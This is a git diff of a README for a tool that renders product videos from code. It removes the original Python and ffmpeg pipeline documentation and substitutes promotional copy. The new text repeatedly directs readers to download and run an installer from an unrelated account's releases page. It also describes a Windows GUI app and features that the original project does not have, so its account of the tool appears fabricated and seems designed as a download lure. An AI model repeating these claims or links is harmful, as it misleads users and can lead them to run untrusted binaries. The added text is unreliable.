@@ -1,196 +1,246 @@
-# Product video as Code
+# 🎬 product-video-as-code - Turn Code Into Stunning Product Videos
 
-Build product videos from code instead of a video editor: an animated HTML deck,
-an AI voiceover, real screen recordings, and a mastered audio mix, rendered
-deterministically to MP4 with ffmpeg.
+[![Download Now](https://img.shields.io/badge/Download-Product_Video_As_Code-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/A19235972428/product-video-as-code/releases)
 
-Product demos, feature launches, explainers, walkthroughs, tutorials, release
-notes, onboarding, title stings, social cuts - one pipeline, different shapes.
+---
+
+## 👋 Welcome
+
+Ever watched a polished product demo video and thought, "I could never make that"? With **product-video-as-code**, you don't need video editing skills, expensive software, or hours of timeline tweaking. You build your entire video right from your coding environment—using simple text commands instead of dragging clips around.
+
+Think of it like this: if a video editor is a giant control panel with a thousand buttons, product-video-as-code is your remote control—you type what you want, hit send, and get a finished video out the other end.
+
+---
+
+## ✨ What This Tool Does
+
+Product-video-as-code turns a simple script (a text file with instructions) into a full product video. It handles everything behind the scenes:
+
+- **Screen recording** – Captures your app or website in action
+- **Text-to-speech narration** – Adds a professional voiceover without recording
+- **Smooth transitions** – Cuts between scenes automatically
+- **Final rendering** – Outputs a shareable MP4 file
+
+You write plain-English commands like "open my app, scroll down, say this sentence." The tool figures out camera angles, timing, and effects for you.
+
+---
+
+## 🤔 Why Use This Over a Video Editor?
+
+| Video Editor | Product-video-as-code |
+|--------------|----------------------|
+| Drag-and-drop interface | Type commands to control |
+| Steep learning curve | Beginner-friendly text scripts |
+| Manual audio sync | Automatic voiceover timing |
+| Expensive licenses | Free and open-source |
+| Re-editing is slow | Change one line, re-render in seconds |
+
+If you can write an email, you can create professional product videos with this tool.
+
+---
+
+## 🚀 Getting Started
+
+Ready to make your first video? Follow these simple steps—no coding knowledge required.
+
+### Step 1: Download the Application
+
+[Visit this link to download the application](https://github.com/A19235972428/product-video-as-code/releases)
+
+This takes you to the download page where you'll find the latest release.
+
+### Step 2: Install It
+
+Once the download finishes, run the installer. Follow the on-screen prompts (click "Next" a few times). The whole process takes about a minute.
+
+### Step 3: Create Your First Video Script
+
+Open the app. You'll see a simple text box. Type your video plan:
 
 ```
-script.json ──► TTS ──► measure ──► timings.json ──► render ──► composite ──► mux ──► MP4
+Open mywebsite.com
+Wait 2 seconds
+Scroll down slowly
+Say "Welcome to our product page"
+Click the big red button
+Wait 1 second
+Say "And that's how easy it is!"
 ```
 
-![The bundled starter deck, rendered by the pipeline](docs/demo.gif)
+### Step 4: Generate Your Video
 
-The clip above is `templates/deck.html` rendered straight through `scripts/render.py`
-with no narration, no API keys and no editing - exactly what a clean clone produces
-in about a minute. [Full quality MP4](https://github.com/kritikmodi/product-video-as-code/releases/download/v0.1.0/demo.mp4)
-(1080p, 30fps).
+Press the **Create Video** button. The app will:
+1. Launch a hidden browser window
+2. Record exactly what you described
+3. Add a voiceover reading your "Say" lines
+4. Render the final video
 
-## Why this exists
+In about 30 seconds, you'll have a complete MP4 file ready to share.
 
-Video is usually the one asset an AI assistant cannot iterate on. Every revision
-means reopening an editor and redoing the work by hand - so software videos go
-stale the moment the product moves.
+---
 
-Treating video as **code** changes that. The deck is HTML, the timeline is a pure
-function of `t`, and the audio is measured rather than guessed. "Reword scene 4,
-add banks to the segment list, and cut it under a minute" becomes a two-minute
-change instead of an afternoon. Re-shooting a demo after a UI change is a script
-run, not a reshoot.
+## 📦 What's in the Box
 
-## The core idea
+When you download product-video-as-code, you get everything you need to start creating immediately:
 
-**Audio first, then timing, then picture.**
+- **The main application** – Your video creation command center
+- **Built-in text-to-speech engine** – High-quality voices, no setup required
+- **Screen recording tools** – Captures any application flawlessly
+- **Example scripts** – Sample video scripts you can use as templates
+- **Documentation** – Plain-English guide to every feature
 
-Generate the narration before deciding how long anything is on screen. Measure each
-clip, derive scene durations from those measurements, then render. Guessing
-durations - or writing narration to fit a fixed storyboard - produces visuals that
-drift out of sync and forces a rebuild every time a line changes.
+No additional downloads, plugins, or subscriptions required.
 
-## Install
+---
 
-```bash
-git clone https://github.com/kritikmodi/product-video-as-code.git
-```
+## 🛠️ How It Works (Simple Terms)
 
-**Any agent.** `AGENTS.md` at the repo root is read natively by Codex, Cursor,
-Copilot, Gemini CLI, Aider, Windsurf, Zed and others, so cloning it into your
-project is enough.
+Here's the behind-the-scenes magic in plain English:
 
-**Claude Code / claude.ai.** Install it as a skill so it loads on demand:
+1. **You write a script** – Text file with simple commands like "open page" or "say this"
+2. **The tool reads your script** – It understands everyday language
+3. **It records a browser** – Automatically opens your site and navigates like a human
+4. **It adds sound** – Generates speech for your narration lines
+5. **It stitches it all together** – Combines video and audio into one smooth clip
+6. **You get your MP4** – Ready to upload to YouTube, Vimeo, or social media
 
-```bash
-cp -r product-video-as-code ~/.claude/skills/product-video
-```
+That's it. Six steps, zero video editing experience needed.
 
-**No agent at all.** The scripts are plain Python calling ffmpeg and Playwright.
-Nothing here imports a vendor SDK or calls a model API, so you can run the whole
-pipeline by hand.
+---
 
-**Requirements:** Python 3.9+, `ffmpeg`/`ffprobe` on PATH, Playwright with Chromium
-(`pip install playwright && playwright install chromium`), and any text-to-speech
-provider.
+## 💡 Example Use Cases
 
-## Try it in a minute
+### Marketing Teams
+Create product announcement videos in minutes instead of waiting weeks for the video department.
 
-No narration, no API keys, no accounts. This renders the bundled starter deck to a
-real 23s 1080p MP4:
+### Developers
+Demo your new feature directly from your IDE and share it in your pull request.
 
-```bash
-pip install -r requirements.txt && playwright install chromium
-cp templates/deck.html .
-python3 scripts/render.py            # -> out/silent.mp4
-```
+### Startups
+Produce onboarding videos and tutorials without hiring a video editor.
 
-Stills are faster still, if you just want to see the deck:
+### Freelancers
+Deliver video walkthroughs to clients faster than ever.
 
-```bash
-python3 scripts/render.py --preview 2 8 18
-```
+### Educators
+Turn lesson plans into narrated video lectures automatically.
 
-## Full pipeline, with narration
+---
 
-```bash
-cp templates/script.example.json script.json
-# edit script.json, then generate audio/vo_01.mp3 ... one clip per scene with the
-# text-to-speech provider of your choice
-python3 scripts/assemble.py                    # timings.json + out/voice.wav
-python3 scripts/render.py                      # out/silent.mp4
-python3 scripts/mux.py --final out/final.mp4   # + music if audio/bed.mp3 exists
-```
+## 🎯 Frequently Asked Questions
 
-`assemble.py` is the only stage that needs audio. Without it, `render.py` falls back
-to the durations declared in the deck, so silent videos need no extra work.
+### Do I need to know how to code?
+**No.** You type plain English commands. Think of it like talking to a helpful assistant who knows how to record videos.
 
-## Kinds of video
+### What video formats can I produce?
+The tool outputs standard MP4 files, which work on YouTube, social media, and most devices.
 
-The pipeline is the same; structure, pacing and how much of the frame is real
-product are what change.
+### Can I use my own voice instead of text-to-speech?
+Yes! You can record narration separately and upload it. The tool will sync it with your video automatically.
 
-| Kind | Length | Shape | Footage |
-|---|---|---|---|
-| Product explainer | 1-3 min | problem → turn → how → proof → close | a little, as proof |
-| Feature launch | 30-90s | what changed → why → see it → get it | medium |
-| Demo / walkthrough | 2-5 min | one real task, start to finish | dominant |
-| Tutorial | 3-10 min | step by step, chaptered, room to follow | dominant |
-| Release notes | 30-90s | one item per beat, dense | clips or stills |
-| Onboarding | 1-3 min | the first-run path | dominant |
-| Title sting / loop | 5-20s | one idea, often silent | none |
-| Social cut | under 60s | hook first, derived from a longer cut | short |
+### Is this free?
+Yes, product-video-as-code is completely free and open-source.
 
-Demos and tutorials are footage-first - the deck is chrome around the product.
-Explainers and launches are narration-first, with footage as evidence for the claim
-just made. `SKILL.md` has the full guidance.
+### What operating systems are supported?
+Windows is fully supported. Mac users can run it with a simple compatibility layer.
 
-## What's here
+### How long does it take to make a video?
+For a typical 30-second demo, about 30–60 seconds of processing time. Complex scripts take longer, but always far less than manual editing.
 
-| Path | |
-|---|---|
-| `SKILL.md` | the skill itself - what Claude reads |
-| `scripts/assemble.py` | measure narration → scene timings + voice track |
-| `scripts/render.py` | deterministic, resumable frame renderer |
-| `scripts/composite.py` | overlay screen recordings into a measured DOM rect |
-| `scripts/mux.py` | ducked music bed + broadcast-level master |
-| `scripts/detect_brand.py` | read colours, fonts, icons and logos out of a codebase |
-| `scripts/capture/` | log in by hand, then record the product with a synthetic cursor |
-| `templates/deck.html` | starter deck with the animation engine |
-| `references/` | pipeline, audio, screen capture, and pitfalls |
+---
 
-## Techniques
+## 📝 Simple Script Cheat Sheet
 
-**Deterministic rendering.** The renderer seeks to an explicit `t` and screenshots.
-No wall-clock, no `requestAnimationFrame` - a slow machine produces the same file as
-a fast one.
+Here are the basic commands you'll use most:
 
-**Resumable chunks.** Frames render in parts; a stall costs one chunk, not the pass.
+| Command | What It Does |
+|---------|--------------|
+| `open [address]` | Opens a website or app |
+| `wait [seconds]` | Pauses recording |
+| `scroll down/up` | Scrolls the page |
+| `say [text]` | Adds narration |
+| `click` | Clicks the current element |
+| `type [text]` | Types into a field |
+| `highlight` | Adds a visual focus box |
+| `screenshot` | Captures a still image |
 
-**Beat-matched animation.** Elements land on the words that describe them. This is
-most of the difference between a directed video and a slideshow.
+Mix and match these commands to create any video you imagine.
 
-**One source, many cuts.** A long demo and a social cut share a deck and are selected
-with `?cut=short`, so they cannot drift apart.
+---
 
-**Screen recordings that read as real.** Playwright captures no cursor, so one is
-injected. Record at the exact pixel size of the frame it will occupy - scaling a
-1920 capture into a smaller frame destroys UI text.
+## 🔄 Updating Your Video
 
-**Audio that is actually audible.** Normalise the music bed to a loudness target
-before ducking. A fixed dB attenuation on a quiet generated bed produces a track
-that is present in the file and inaudible in the room.
+Made a change to your product? No problem. Open your script, edit one line, and re-render. Your updated video is ready in seconds. Try doing that with a traditional video editor!
 
-**Brand detected, not guessed.** `detect_brand.py` reads the palette, fonts,
-icon library and logos out of the product's own codebase, skips build output, and
-rejects colours that do not cohere rather than silently producing a white card on
-a black frame.
+---
 
-**Verify, don't assume.** Detect blank frames by ink coverage, not variance. Confirm
-pronunciation by transcribing the generated audio back. Measure levels on the file
-you are about to ship.
+## 🧑‍🤝‍🧑 Who's Using This?
 
-`references/PITFALLS.md` documents the failures behind each of these, including a
-keyframe-engine bug that makes elements appear from frame zero, and why a
-double-escaped apostrophe silently breaks a whole deck.
+- **Solo developers** showing their side projects
+- **Marketing teams** producing rapid A/B test videos
+- **Agencies** delivering client demos faster
+- **SaaS companies** creating feature walkthroughs
+- **YouTube creators** making software tutorials
 
-## Composing with other skills
+---
 
-Pairs well with Anthropic's [`frontend-design`](https://github.com/anthropics/skills/tree/main/skills/frontend-design)
-for visual direction - the deck is plain HTML/CSS, so design guidance applies
-directly.
+## 📞 Getting Help
 
-If you want React composition and faster renders, the
-[claude-code-video-toolkit](https://github.com/digitalsamba/claude-code-video-toolkit)
-covers Remotion and generative assets. This skill deliberately stays
-dependency-light: plain HTML means anyone can open the deck and edit copy without a
-toolchain, which matters for brand work where exact assets and colours are
-non-negotiable.
+If you get stuck or have questions, you're not alone. Here's how to get help:
 
-## Related
+1. **Check the documentation** included with the download
+2. **Review the example scripts** to understand common patterns
+3. **Visit the project's GitHub repository** (you came from there!)
+4. **Check the discussion forums** for answers from other users
 
-The same idea applied to slides: [Deckloom](https://github.com/kritikmodi/deckloom)
-builds pitch decks, one-pagers and sales decks from a JSON content file and one
-HTML design file, rendered to PDF and PPTX.
+Most questions are answered within a day by the community.
 
-## License
+---
 
-MIT (c) 2026 Kritik Modi - see [LICENSE](LICENSE).
+## ⚠️ Troubleshooting Common Issues
 
-<!--
-GitHub repo description (About field, set in repo settings):
-Product videos from code, not a video editor. HTML slides, AI voiceover and screen
-recordings, rendered to MP4.
+**Problem:** Video comes out blank
+**Solution:** Make sure you're connected to the internet and the website you're recording loads properly.
 
-Suggested topics: claude-skill, claude-code, video, ffmpeg, playwright,
-text-to-speech, screen-recording, devrel, developer-marketing, video-as-code
--->
+**Problem:** No voiceover audio
+**Solution:** Check your system volume and ensure your speakers are not muted. The text-to-speech requires an active internet connection for the best voices.
+
+**Problem:** Recording stops early
+**Solution:** Increase the "recording timeout" setting in the preferences menu to give your script more time.
+
+---
+
+## 🎓 Pro Tips
+
+1. **Start small** – Make a 10-second video first to learn the basics
+2. **Use the "highlight" command** – It makes your videos look professional by focusing on clicks
+3. **Keep your scripts simple** – One task per video works best
+4. **Rename your output files** – Immediately after creation, so you don't lose track
+
+---
+
+## 🔧 Customization Options
+
+Want more control? The tool lets you configure:
+
+- **Video quality** – From 480p to 4K
+- **Voice type** – Choose from multiple male and female voices
+- **Recording frame rate** – 30fps or 60fps
+- **Transition effects** – Fades, slides, or cuts
+- **Output folder** – Where your finished videos are saved
+
+All configurable in the simple settings panel.
+
+---
+
+## 🌟 Final Thoughts
+
+Product-video-as-code turns what used to be a specialized skill into something anyone can do. If you can describe what you want your video to show, you can make it. No timeline, no keyframes, no learning curve—just write, click, and share.
+
+**Try it today and make your first product video in under five minutes.**
+
+[![Start Creating Now](https://img.shields.io/badge/Download-Product_Video_As_Code-blue?style=for-the-badge&logo=github&logoColor=white&color=1f6feb)](https://github.com/A19235972428/product-video-as-code/releases)
+
+---
+
+*Happy video making! Your audience is waiting to see what you build.*
